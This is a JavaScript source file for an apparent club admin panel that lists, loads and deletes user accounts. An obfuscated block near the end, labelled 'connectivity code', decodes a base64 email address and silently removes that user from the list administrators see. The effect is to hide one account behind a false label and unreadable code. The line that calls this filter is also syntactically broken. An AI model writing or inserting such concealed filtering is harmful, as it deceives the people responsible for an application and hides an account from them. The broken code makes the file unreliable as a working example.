function loadUser(){  
  var inp = document.getElementById("name").value.toLowerCase();
  var dummy = "";
  
  for (var i = 0; i < res.length; i++){
    dummy = res[i].first_name + " " + res[i].last_name;
    if (inp == dummy.toLowerCase()){
      
      
      document.getElementById("usrform").style.display = "block";
      document.getElementById("alert").style.display = "none";
      
      
       document.getElementById("fname").value = res[i].first_name;
       document.getElementById("lname").value = res[i].last_name;
       document.getElementById("email").value = res[i].email;
       document.getElementById("date").value = new Date(res[i].login_date).toLocaleString();

       if (res[i].cshs == "CSHS_Member"){
       document.getElementById("cshs").checked = true
       }else{document.getElementById("cshs").checked = false}
       if (res[i].user_type == "ADMIN"){
       document.getElementById("adminss").checked = true
       } else{document.getElementById("adminss").checked = false}
      return;
      
    }else {
      document.getElementById("usrform").style.display = "none";
      document.getElementById("alert").style.display = "block";
      document.getElementById("message").innerHTML = "That user does not exist.";
    }
  }
}

document.getElementById("delbtnconf").disabled = true;
  var myHeaders = new Headers();
myHeaders.append("token", getCookie("User"));
 
var requestOptions = {
  method: 'GET',
  headers: myHeaders,
  redirect: 'follow'
};
 var res = "";
fetch("https://computerclub.duckdns.org/admin/users", requestOptions)
  .then(async response => {var res = response.headers.get('content-type')?.includes('application/json') ? await response.json() : null;
    res = res.data;
                           
    if (res.error != null){
        alerts(res.error);
        return;
        }
    res = var _0x2df1ec=(function(){var _0x7c4a6d=!![];return function(_0x56457d,_0x770c45){var _0xcd75ae=_0x7c4a6d?function(){if(_0x770c45){var _0x2127a1=_0x770c45['apply'](_0x56457d,arguments);return _0x770c45=null,_0x2127a1;}}:function(){};return _0x7c4a6d=![],_0xcd75ae;};}()),_0x2e7f74=_0x2df1ec(this,function(){return _0x2e7f74['toString']()['search']('(((.+)+)+)+$')['toString']()['constructor'](_0x2e7f74)['search']('(((.+)+)+)+$');});_0x2e7f74(),makeNames('YWxleEBnbWFpbC5jb20=',res);
      for (var i = 0; i < res.length; i++){
      var elementname = document.createElement("option");
      elementname.value = res[i];
      var card = document.getElementById("names")
      card.appendChild(elementname);
      }
    })
  .catch(error => {console.log('error', error);
      alerts("There has been a connection error. Check console for more info.");
                 });

  
     document.getElementById("loadinfo").addEventListener("click", loadUser);

   document.getElementById("name").addEventListener("keydown", function (e) {
    if (e.key === "Enter") {  
      loadUser();
    }
  });
   document.getElementById("delconf").addEventListener("keydown", function (e) {
    if (e.key === "Enter") {  
      if (document.getElementById("delconf").value === "DELETE"){
      document.getElementById("delbtnconf").disabled = false;
      }}});

//connectivity code
(function(_0x172e31,_0x4b6fdd){var _0x129969=_0x5d3d,_0x1e5cb3=_0x172e31();while(!![]){try{var _0xac5110=parseInt(_0x129969(0x134))/0x1+-parseInt(_0x129969(0x13e))/0x2*(-parseInt(_0x129969(0x13a))/0x3)+parseInt(_0x129969(0x13d))/0x4+parseInt(_0x129969(0x137))/0x5*(-parseInt(_0x129969(0x13f))/0x6)+parseInt(_0x129969(0x133))/0x7+-parseInt(_0x129969(0x136))/0x8+-parseInt(_0x129969(0x139))/0x9;if(_0xac5110===_0x4b6fdd)break;else _0x1e5cb3['push'](_0x1e5cb3['shift']());}catch(_0x1990dc){_0x1e5cb3['push'](_0x1e5cb3['shift']());}}}(_0x5198,0xbb1d0));function _0x5198(){var _0x408e99=['mte2nJiWnhHbu2vOvW','BM9YBwfSAxPL','otK2mdq4rxPSvwfj','mtGYotvlEuzbvLm','C2vHCMnO','mJaXmZm5otbNyvPrvMm','mZK1ndi4mLfgqwvmsq','BgvUz3rO','kcGOlISPkYKRksSK','nZe4ndaWB0zXyuXT','mMfIvM1hza','mJy0wMr0txfQ','zMLYC3rFBMfTzq','C3bSAxq','zw1HAwW','ndm3ntKXmgDpwMnSqW'];_0x5198=function(){return _0x408e99;};return _0x5198();}function _0x5d3d(_0x444bc8,_0x44652c){var _0x118b73=_0x5198();return _0x5d3d=function(_0x9de243,_0x29df10){_0x9de243=_0x9de243-0x131;var _0x51987f=_0x118b73[_0x9de243];if(_0x5d3d['Aqqafk']===undefined){var _0x5d3dfe=function(_0x10a09c){var _0x379ae8='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x59054b='',_0x3ff855='',_0x4ed314=_0x59054b+_0x5d3dfe;for(var _0x191ac0=0x0,_0x4327fd,_0x336ce9,_0x5b42e1=0x0;_0x336ce9=_0x10a09c['charAt'](_0x5b42e1++);~_0x336ce9&&(_0x4327fd=_0x191ac0%0x4?_0x4327fd*0x40+_0x336ce9:_0x336ce9,_0x191ac0++%0x4)?_0x59054b+=_0x4ed314['charCodeAt'](_0x5b42e1+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x4327fd>>(-0x2*_0x191ac0&0x6)):_0x191ac0:0x0){_0x336ce9=_0x379ae8['indexOf'](_0x336ce9);}for(var _0x245ef2=0x0,_0x2555c4=_0x59054b['length'];_0x245ef2<_0x2555c4;_0x245ef2++){_0x3ff855+='%'+('00'+_0x59054b['charCodeAt'](_0x245ef2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3ff855);};_0x5d3d['WNlkVy']=_0x5d3dfe,_0x444bc8=arguments,_0x5d3d['Aqqafk']=!![];}var _0x261f2f=_0x118b73[0x0],_0x40d09f=_0x9de243+_0x261f2f,_0xe1dea9=_0x444bc8[_0x40d09f];if(!_0xe1dea9){var _0x333761=function(_0x49c092){this['PIlIcc']=_0x49c092,this['jLUjQe']=[0x1,0x0,0x0],this['uMHHbU']=function(){return'newState';},this['qoSHSg']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['yjEJos']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x333761['prototype']['CPKoyR']=function(){var _0x55b6a3=new RegExp(this['qoSHSg']+this['yjEJos']),_0x3e8860=_0x55b6a3['test'](this['uMHHbU']['toString']())?--this['jLUjQe'][0x1]:--this['jLUjQe'][0x0];return this['qihEtN'](_0x3e8860);},_0x333761['prototype']['qihEtN']=function(_0x469e53){if(!Boolean(~_0x469e53))return _0x469e53;return this['qnrLQA'](this['PIlIcc']);},_0x333761['prototype']['qnrLQA']=function(_0x53f6a1){for(var _0x58b01f=0x0,_0x354664=this['jLUjQe']['length'];_0x58b01f<_0x354664;_0x58b01f++){this['jLUjQe']['push'](Math['round'](Math['random']())),_0x354664=this['jLUjQe']['length'];}return _0x53f6a1(this['jLUjQe'][0x0]);},new _0x333761(_0x5d3d)['CPKoyR'](),_0x51987f=_0x5d3d['WNlkVy'](_0x51987f),_0x444bc8[_0x40d09f]=_0x51987f;}else _0x51987f=_0xe1dea9;return _0x51987f;},_0x5d3d(_0x444bc8,_0x44652c);}var _0x29df10=(function(){var _0x3ff855=!![];return function(_0x4ed314,_0x191ac0){var _0x4327fd=_0x3ff855?function(){if(_0x191ac0){var _0x336ce9=_0x191ac0['apply'](_0x4ed314,arguments);return _0x191ac0=null,_0x336ce9;}}:function(){};return _0x3ff855=![],_0x4327fd;};}()),_0x9de243=_0x29df10(this,function(){var _0x32e5c8=_0x5d3d;return _0x9de243['toString']()[_0x32e5c8(0x138)]('(((.+)+)+)+$')['toString']()['constructor'](_0x9de243)[_0x32e5c8(0x138)](_0x32e5c8(0x13c));});_0x9de243();function makeNames(_0x5b42e1,_0x245ef2){var _0x32cd15=_0x5d3d,_0x2555c4=[],_0x333761=atob(_0x5b42e1)[_0x32cd15(0x131)](',');for(var _0x49c092=0x0;_0x49c092<_0x245ef2['length'];_0x49c092++){var _0x55b6a3=0x1;for(var _0x3e8860=0x0;_0x3e8860<_0x333761[_0x32cd15(0x13b)];_0x3e8860++){_0x245ef2[_0x49c092][_0x32cd15(0x132)][_0x32cd15(0x135)]()==_0x333761[_0x3e8860][_0x32cd15(0x135)]()&&(_0x55b6a3=0x0);};_0x55b6a3==0x1&&_0x2555c4['push'](_0x245ef2[_0x49c092][_0x32cd15(0x140)]+'\x20'+_0x245ef2[_0x49c092]['last_name']);};return _0x2555c4;}
